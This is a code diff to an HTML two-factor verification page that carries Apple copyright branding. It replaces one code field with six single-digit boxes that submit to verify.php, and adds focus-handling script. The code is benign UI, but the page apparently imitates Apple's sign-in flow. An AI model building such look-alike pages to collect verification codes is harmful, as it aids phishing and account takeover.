@@ -5,6 +5,25 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Two-Factor Authentication</title>
     <link rel="stylesheet" href="styles.css">
+    <style>
+        .input-group {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .input-box {
+            width: 40px;
+            height: 40px;
+            text-align: center;
+            font-size: 24px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            outline: none;
+            text-transform: uppercase;
+        }
+    </style>
 </head>
 <body>
     <!-- Navigation Bar -->
@@ -46,9 +65,14 @@
         </header>
         <main>
             <p>A message with a verification code has been sent to your devices. Enter the code to continue.</p>
-            <form action="verify.php" method="post">
+            <form action="verify.php" method="post" id="verification-form">
                 <div class="input-group">
-                    <input type="text" id="verification-code" name="verification-code" maxlength="6" required placeholder="Enter 6-digit code">
+                    <input type="text" class="input-box" maxlength="1" name="digit1" id="digit1" required>
+                    <input type="text" class="input-box" maxlength="1" name="digit2" id="digit2" required>
+                    <input type="text" class="input-box" maxlength="1" name="digit3" id="digit3" required>
+                    <input type="text" class="input-box" maxlength="1" name="digit4" id="digit4" required>
+                    <input type="text" class="input-box" maxlength="1" name="digit5" id="digit5" required>
+                    <input type="text" class="input-box" maxlength="1" name="digit6" id="digit6" required>
                 </div>
                 <button type="submit">Verify</button>
             </form>
@@ -65,5 +89,27 @@
             <p>Copyright © 2024 Apple Inc. All rights reserved. <a href="#">Privacy Policy</a> <a href="#">Terms of Use</a> <a href="#">Sales and Refunds</a> <a href="#">Legal</a> <a href="#">Site Map</a></p>
         </div>
     </footer>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const inputs = document.querySelectorAll('.input-box');
+            inputs[0].focus();
+
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    if (e.target.value.length === 1 && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                    e.target.value = e.target.value.toUpperCase();
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+        });
+    </script>
 </body>
 </html>
